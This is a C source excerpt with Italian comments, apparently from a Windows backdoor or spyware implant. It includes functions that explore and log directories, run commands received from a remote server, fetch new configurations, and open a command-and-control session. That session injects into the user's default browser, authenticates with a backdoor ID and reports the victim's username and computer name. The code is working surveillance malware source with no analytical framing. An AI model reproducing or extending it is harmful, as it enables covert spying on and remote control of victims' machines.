	if (!ASP_GetFileSystem(&num_fs, &fs_array))
		return FALSE;

	// Per ogni entry...
	for(i=0; i < num_fs; i++) {
		if (FNC(ExpandEnvironmentStringsW)(fs_array[i].start_dir, dir_expanded, MAX_PATH)) {
			hfile = Log_CreateFile(PM_EXPLOREDIR, NULL, 0);
			ExploreDirectory(hfile, dir_expanded, fs_array[i].depth);
			Log_CloseFile(hfile);
		}
		SAFE_FREE(fs_array[i].start_dir);
	}
	SAFE_FREE(fs_array);
	return TRUE;
}

// Gestisce le richieste di esecuzione diretta di comandi
BOOL LOG_HandleCommands()
{
	WCHAR **cmd_array;
	char ascii_command[MAX_PATH * 2];
	DWORD num_cmd, i;

	// Di tutti gli elementi di cmd_array andranno liberate le stringhe
	if (!ASP_GetCommands(&num_cmd, &cmd_array))
		return FALSE;

	// Per ogni entry...
	for(i=0; i < num_cmd; i++) {
		_snprintf_s(ascii_command, sizeof(ascii_command), _TRUNCATE, "%S", cmd_array[i]);
		SAFE_FREE(cmd_array[i]);
		DA_Execute((BYTE *)ascii_command);
	}
	SAFE_FREE(cmd_array);
	return TRUE;
}

// Legge (se c'e') un nuovo file di configurazione
BOOL LOG_ReceiveNewConf()
{
	char conf_path[DLLNAMELEN];

	if (!ASP_ReceiveConf(HM_CompletePath(H4_CONF_BU, conf_path)))
		return FALSE;

	// Controlla se il file e' arrivato integro.
	// Se si, lo copia sulla configurazione originale 
	// e cancella la copia di backup. altrimenti cancella 
	// la copia non integra e basta. Torna TRUE se 
	// ha copiato con successo.
	if (!HM_CheckNewConf(H4_CONF_BU))
		return FALSE;

	return TRUE; 
}


// Inizializza la connessione, esegue AUTH e ID
// Se torna FALSE la sync si deve interrompere
// Se torna FALSE e uninstall==TRUE, si deve disinstallare
BOOL LOG_StartLogConnection(char *asp_server, char *backdoor_id, BOOL *uninstall, long long *time_date, DWORD *availables, DWORD size_avail)
{
	char asp_process[DLLNAMELEN+2]; // Il nome del processo avra' le ""
	char subtype[16];
	BYTE instance_id[20];
	WCHAR usr_var[80];
	WCHAR dev_var[80];
	DWORD response_command;

	*uninstall = FALSE;

	// Legge il browser di default
	HM_GetDefaultBrowser(asp_process);

	// Inizializza ASP
	if (!ASP_Start(asp_process, asp_server)) {
		// Se per qualche motivo non riesce a iniettarsi nel default browser, prova con IE32
		HM_GetIE32Browser(asp_process);
		if (!ASP_Start(asp_process, asp_server))
			return FALSE;
	}

	// Seleziona il subtype
	/*if (IsX64System()) 
		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN64");		
	else
		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WIN32");*/
	if (is_demo_version) 
		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WINDOWS-DEMO");		
	else
		_snprintf_s(subtype, sizeof(subtype), _TRUNCATE, "WINDOWS");

	// Seleziona l'instance_id univoco
	if (!GetUserUniqueHash((BYTE *)instance_id, sizeof(instance_id))) {
		ASP_Stop();
		return FALSE;
	}

	if (!ASP_Auth(backdoor_id, instance_id, subtype, crypt_key_conf, &response_command)) {
		ASP_Stop();
		return FALSE;
	}

	if (response_command != PROTO_OK) {
		if (response_command == PROTO_UNINSTALL) 
			*uninstall = TRUE;
		ASP_Stop();
		return FALSE;
	}

	// nome dell'utente e deviceid
	memset(usr_var, 0, sizeof(usr_var));
	memset(dev_var, 0, sizeof(dev_var));
	usr_var[0]=L'-';
	dev_var[0]=L'-';
	FNC(GetEnvironmentVariableW)(L"USERNAME", (WCHAR *)usr_var, sizeof(usr_var)/sizeof(WCHAR)-2);
	FNC(GetEnvironmentVariableW)(L"COMPUTERNAME", (WCHAR *)dev_var, sizeof(dev_var)/sizeof(WCHAR)-2);

	if (!ASP_Id(usr_var, dev_var, time_date, availables, size_avail)) {
		ASP_Stop();
		return FALSE;
	}

	return TRUE;
}


// Chiude la connessione per l'invio dei log
void LOG_CloseLogConnection()
{
	ASP_Stop();
}